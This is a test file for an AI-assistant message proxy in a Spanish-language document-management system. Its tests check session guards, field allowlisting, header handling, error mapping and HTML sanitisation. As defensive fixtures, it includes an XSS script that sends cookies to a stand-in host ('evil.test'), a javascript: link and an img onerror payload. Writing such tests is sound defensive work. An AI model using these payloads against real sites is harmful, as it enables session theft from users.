// OrpycaMCP — Sistema de Gestión Documental Electrónico de Archivo (SGDEA).
// Desarrollo original de Orpyca; adaptado a partir de Orfeo bajo licencia GPL.
// Contacto: aurigadl@gmail.com
//
// Software libre: este archivo se distribuye bajo la Licencia Pública General
// Affero de GNU (AGPL) versión 3 o, a su elección, cualquier versión posterior,
// conservando los términos de la GPL del Orfeo original del que deriva. Se entrega
// SIN GARANTÍA ALGUNA. Véase el archivo LICENSE y <https://www.gnu.org/licenses/>.

/**
 * message-server.test.js — Proxy SSR `/asistente/api/message` (D-05, E22/E18).
 *
 * Cubre:
 *  - Guard de sesión: 401 sin locals.accessToken, ANTES de leer el body o llamar al gateway.
 *  - Allowlist campo a campo: solo `mensaje`/`conversation_id` cruzan al gateway; campos
 *    extra del body del cliente (anti mass-assignment) se descartan.
 *  - Headers derivados de `locals` (Authorization/X-Tenant-Slug/X-User-Id/X-Username),
 *    NUNCA del body del cliente.
 *  - Traducción de ausencia/degradación del backend (fetch lanza, 404/501/502/503/504) a
 *    `503 assistant_unavailable` — el estado HONESTO que exige el contrato, nunca una
 *    respuesta fabricada.
 *  - Propagación de 401/400 reales del gateway.
 *  - Saneo server-side del markdown del asistente (contenido NO CONFIABLE) antes de
 *    cruzar al cliente — el vector XSS clásico no debe sobrevivir en `message.html`.
 *  - El `access_token` nunca aparece en el cuerpo de la respuesta al cliente (D-05).
 */
import { describe, it, expect, vi, afterEach } from "vitest";
import { POST } from "./+server.js";

/** Instala un mock de `fetch` global (el proxy usa `fetch` global, no `event.fetch`). */
function stubFetch(impl) {
  const fn = vi.fn(impl);
  vi.stubGlobal("fetch", fn);
  return fn;
}

/** `fetch` que revienta si se invoca — prueba que el guard corre ANTES de llamar al gateway. */
function fetchThatMustNotBeCalled() {
  return stubFetch(() => {
    throw new Error("fetch no debió invocarse sin sesión/con payload inválido");
  });
}

function jsonResponse(status, body) {
  return { ok: status >= 200 && status < 300, status, json: async () => body };
}

const SESSION_LOCALS = {
  accessToken: "token-abc-123",
  user: { sub: "user-1", tenant_slug: "icetex", preferred_username: "operador1" },
};

function requestWith(body) {
  return { json: async () => body };
}

afterEach(() => {
  vi.unstubAllGlobals();
});

describe("POST /asistente/api/message — guard de sesión (D-05)", () => {
  it("sin locals.accessToken → 401 unauthenticated, no llama al gateway", async () => {
    const fetchMock = fetchThatMustNotBeCalled();
    const res = await POST({ locals: {}, request: requestWith({ mensaje: "hola" }) });

    expect(res.status).toBe(401);
    expect((await res.json()).error).toBe("unauthenticated");
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it("locals.accessToken vacío también se trata como sin sesión", async () => {
    fetchThatMustNotBeCalled();
    const res = await POST({
      locals: { accessToken: "" },
      request: requestWith({ mensaje: "hola" }),
    });
    expect(res.status).toBe(401);
  });

  it("body no-JSON → 400 invalid_body, no llama al gateway", async () => {
    const fetchMock = fetchThatMustNotBeCalled();
    const res = await POST({
      locals: SESSION_LOCALS,
      request: {
        json: async () => {
          throw new SyntaxError("bad json");
        },
      },
    });
    expect(res.status).toBe(400);
    expect((await res.json()).error).toBe("invalid_body");
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it("mensaje vacío/ausente → 400 empty_message, no llama al gateway", async () => {
    const fetchMock = fetchThatMustNotBeCalled();
    const res = await POST({ locals: SESSION_LOCALS, request: requestWith({ mensaje: "   " }) });
    expect(res.status).toBe(400);
    expect((await res.json()).error).toBe("empty_message");
    expect(fetchMock).not.toHaveBeenCalled();
  });
});

describe("POST /asistente/api/message — allowlist anti mass-assignment", () => {
  it("solo reenvía mensaje/conversation_id; descarta campos extra del cliente", async () => {
    const fetchMock = stubFetch(async () =>
      jsonResponse(200, {
        conversation_id: "c-1",
        message: { id: "m-1", texto: "ok", formato: "text" },
      }),
    );

    await POST({
      locals: SESSION_LOCALS,
      request: requestWith({
        mensaje: "Radica esta entrada",
        conversation_id: "c-existing",
        // Campos que NUNCA deben cruzar al gateway (mass-assignment / suplantación):
        user_id: "otro-usuario",
        tenant_slug: "otro-tenant",
        role: "admin",
        acciones: [{ tool: "radicar_entrada", auto_confirm: true }],
      }),
    });

    expect(fetchMock).toHaveBeenCalledTimes(1);
    const [, init] = fetchMock.mock.calls[0];
    const sentPayload = JSON.parse(init.body);
    expect(sentPayload).toEqual({ mensaje: "Radica esta entrada", conversation_id: "c-existing" });
  });

  it("trunca el mensaje a 4000 caracteres antes de enviarlo", async () => {
    const fetchMock = stubFetch(async () =>
      jsonResponse(200, {
        conversation_id: null,
        message: { id: "m-1", texto: "ok", formato: "text" },
      }),
    );
    const largo = "a".repeat(5000);

    await POST({ locals: SESSION_LOCALS, request: requestWith({ mensaje: largo }) });

    const [, init] = fetchMock.mock.calls[0];
    const sentPayload = JSON.parse(init.body);
    expect(sentPayload.mensaje).toHaveLength(4000);
  });

  it("conversation_id ausente/no-string no se reenvía", async () => {
    const fetchMock = stubFetch(async () =>
      jsonResponse(200, {
        conversation_id: null,
        message: { id: "m-1", texto: "ok", formato: "text" },
      }),
    );
    await POST({
      locals: SESSION_LOCALS,
      request: requestWith({ mensaje: "hola", conversation_id: 12345 }),
    });
    const [, init] = fetchMock.mock.calls[0];
    expect(JSON.parse(init.body)).toEqual({ mensaje: "hola" });
  });
});

describe("POST /asistente/api/message — headers desde locals, nunca del body (D-05)", () => {
  it("Authorization/X-Tenant-Slug/X-User-Id/X-Username vienen de locals", async () => {
    const fetchMock = stubFetch(async () =>
      jsonResponse(200, {
        conversation_id: null,
        message: { id: "m-1", texto: "ok", formato: "text" },
      }),
    );

    await POST({
      locals: SESSION_LOCALS,
      request: requestWith({
        mensaje: "hola",
        // Intento de suplantar headers vía body — debe ser ignorado.
        Authorization: "Bearer robado",
        "X-User-Id": "suplantado",
      }),
    });

    const [url, init] = fetchMock.mock.calls[0];
    expect(url).toContain("/assistant/message");
    expect(init.headers.Authorization).toBe("Bearer token-abc-123");
    expect(init.headers["X-Tenant-Slug"]).toBe("icetex");
    expect(init.headers["X-User-Id"]).toBe("user-1");
    expect(init.headers["X-Username"]).toBe("operador1");
  });
});

describe("POST /asistente/api/message — backend ausente/degradado → estado honesto (D-05/contrato §2)", () => {
  it("fetch lanza (ECONNREFUSED/DNS) → 503 assistant_unavailable", async () => {
    stubFetch(async () => {
      throw new Error("ECONNREFUSED");
    });
    const res = await POST({ locals: SESSION_LOCALS, request: requestWith({ mensaje: "hola" }) });
    expect(res.status).toBe(503);
    expect((await res.json()).error).toBe("assistant_unavailable");
  });

  it.each([404, 501, 502, 503, 504])(
    "gateway responde %i → 503 assistant_unavailable (nunca una respuesta fabricada)",
    async (status) => {
      stubFetch(async () => jsonResponse(status, { error: "whatever" }));
      const res = await POST({ locals: SESSION_LOCALS, request: requestWith({ mensaje: "hola" }) });
      expect(res.status).toBe(503);
      const data = await res.json();
      expect(data.error).toBe("assistant_unavailable");
    },
  );

  it("el 503 del backend llega con SU motivo, no con un texto fijo", async () => {
    // El backend distingue «sin modelo configurado» de «proveedor caído», que
    // piden cosas distintas a quien lee. Este proxy los aplastaba en un texto
    // único, y la interfaz prometía encima que la función «se activará
    // próximamente».
    const motivo = "Esta instalación no tiene configurado un modelo de lenguaje.";
    stubFetch(async () =>
      jsonResponse(503, {
        detail: { error: "assistant_unavailable", detail: motivo, status: 503 },
      }),
    );
    const res = await POST({ locals: SESSION_LOCALS, request: requestWith({ mensaje: "hola" }) });
    expect(res.status).toBe(503);
    expect(await res.json()).toEqual({ error: "assistant_unavailable", detail: motivo });
  });

  it("un 503 sin el sobre del asistente no reenvía texto ajeno", async () => {
    // Solo se reenvía el motivo del sobre PROPIO: un 503 de otro salto (un
    // proxy intermedio, el propio gateway) no debe poner su texto en el panel.
    stubFetch(async () => jsonResponse(503, { detail: "upstream connect error" }));
    const res = await POST({ locals: SESSION_LOCALS, request: requestWith({ mensaje: "hola" }) });
    const data = await res.json();
    expect(data.detail).not.toContain("upstream");
    expect(data.detail).toMatch(/no responde/);
  });

  it("401 del gateway se propaga tal cual (sesión inválida)", async () => {
    stubFetch(async () =>
      jsonResponse(401, { error: "unauthenticated", detail: "token expirado" }),
    );
    const res = await POST({ locals: SESSION_LOCALS, request: requestWith({ mensaje: "hola" }) });
    expect(res.status).toBe(401);
    expect((await res.json()).detail).toBe("token expirado");
  });

  it("400 del gateway (validación) se propaga con su detail", async () => {
    stubFetch(async () =>
      jsonResponse(400, { error: "invalid_request", detail: "mensaje inválido" }),
    );
    const res = await POST({ locals: SESSION_LOCALS, request: requestWith({ mensaje: "hola" }) });
    expect(res.status).toBe(400);
    expect((await res.json()).detail).toBe("mensaje inválido");
  });
});

describe("POST /asistente/api/message — render 2xx y saneo server-side (D-05)", () => {
  it("formato:text → html null, texto passthrough", async () => {
    stubFetch(async () =>
      jsonResponse(200, {
        conversation_id: "c-9",
        message: {
          id: "m-9",
          role: "assistant",
          texto: "Hola, ¿en qué ayudo?",
          formato: "text",
          ts: "2026-07-15T10:00:00Z",
        },
      }),
    );
    const res = await POST({ locals: SESSION_LOCALS, request: requestWith({ mensaje: "hola" }) });
    const data = await res.json();
    expect(res.status).toBe(200);
    expect(data.conversation_id).toBe("c-9");
    expect(data.message.texto).toBe("Hola, ¿en qué ayudo?");
    expect(data.message.html).toBeNull();
    expect(data.message.role).toBe("assistant");
  });

  it("formato:markdown → texto convertido a HTML permitido (p/strong)", async () => {
    stubFetch(async () =>
      jsonResponse(200, {
        conversation_id: "c-1",
        message: { id: "m-1", texto: "Hola **mundo**", formato: "markdown" },
      }),
    );
    const res = await POST({ locals: SESSION_LOCALS, request: requestWith({ mensaje: "hola" }) });
    const { message } = await res.json();
    expect(message.html).toContain("<strong>mundo</strong>");
    expect(message.html).toContain("<p>");
  });

  it("SANEA un intento de XSS/prompt-injection en el markdown del asistente (contenido NO CONFIABLE)", async () => {
    stubFetch(async () =>
      jsonResponse(200, {
        conversation_id: "c-1",
        message: {
          id: "m-1",
          texto:
            'Resultado: <script>fetch("https://evil.test/steal?c="+document.cookie)</script> listo',
          formato: "markdown",
        },
      }),
    );
    const res = await POST({ locals: SESSION_LOCALS, request: requestWith({ mensaje: "hola" }) });
    const { message } = await res.json();
    expect(message.html.toLowerCase()).not.toContain("<script");
    expect(message.html).not.toContain("document.cookie");
  });

  it("SANEA un href javascript: inyectado como enlace markdown", async () => {
    stubFetch(async () =>
      jsonResponse(200, {
        conversation_id: "c-1",
        message: { id: "m-1", texto: "[click](javascript:alert(1))", formato: "markdown" },
      }),
    );
    const res = await POST({ locals: SESSION_LOCALS, request: requestWith({ mensaje: "hola" }) });
    const { message } = await res.json();
    expect(message.html.toLowerCase()).not.toContain("javascript:");
  });

  it("conversation_id ausente en la respuesta del gateway → null (nunca undefined)", async () => {
    stubFetch(async () =>
      jsonResponse(200, { message: { id: "m-1", texto: "ok", formato: "text" } }),
    );
    const res = await POST({ locals: SESSION_LOCALS, request: requestWith({ mensaje: "hola" }) });
    const data = await res.json();
    expect(data.conversation_id).toBeNull();
  });

  it("D-05: el access_token nunca aparece en el cuerpo de la respuesta al cliente", async () => {
    stubFetch(async () =>
      jsonResponse(200, {
        conversation_id: "c-1",
        message: { id: "m-1", texto: "ok", formato: "text" },
      }),
    );
    const res = await POST({ locals: SESSION_LOCALS, request: requestWith({ mensaje: "hola" }) });
    const raw = JSON.stringify(await res.json());
    expect(raw).not.toContain("token-abc-123");
  });
});

describe("message — las propuestas se reenvían como DATO acotado", () => {
  it("pasa la propuesta campo a campo y descarta lo no declarado", async () => {
    stubFetch(() =>
      jsonResponse(200, {
        conversation_id: "c1",
        message: { texto: "Te lo he preparado.", formato: "markdown" },
        propuestas: [
          {
            id: "p1",
            tool: "radicar_documento",
            operacion: "Radicar un documento",
            campos: [{ arg: "subject", etiqueta: "Asunto", valor: "Tutela", tipo: "string" }],
            irreversible: true,
            expira_en: 1780000000,
            token: "op1.a.b",
            // Campo que el backend no declara: no puede colarse al cliente.
            script: "<img src=x onerror=alert(1)>",
          },
        ],
      }),
    );

    const res = await POST({
      locals: SESSION_LOCALS,
      request: requestWith({ mensaje: "radica esto" }),
    });
    const body = await res.json();

    expect(body.propuestas).toHaveLength(1);
    const p = body.propuestas[0];
    expect(p.token).toBe("op1.a.b");
    expect(p.campos).toEqual([{ etiqueta: "Asunto", valor: "Tutela" }]);
    expect(p).not.toHaveProperty("script");
  });

  it("una propuesta sin token se descarta: no se puede confirmar nada con ella", async () => {
    stubFetch(() =>
      jsonResponse(200, {
        conversation_id: "c1",
        message: { texto: "x", formato: "markdown" },
        propuestas: [{ id: "p1", operacion: "Algo", campos: [] }],
      }),
    );

    const res = await POST({ locals: SESSION_LOCALS, request: requestWith({ mensaje: "hola" }) });
    expect((await res.json()).propuestas).toEqual([]);
  });

  it("sin propuestas el contrato sigue igual que antes (campo aditivo)", async () => {
    stubFetch(() =>
      jsonResponse(200, {
        conversation_id: "c1",
        message: { texto: "Hay 3 radicados.", formato: "markdown" },
      }),
    );

    const res = await POST({ locals: SESSION_LOCALS, request: requestWith({ mensaje: "hola" }) });
    expect((await res.json()).propuestas).toEqual([]);
  });
});
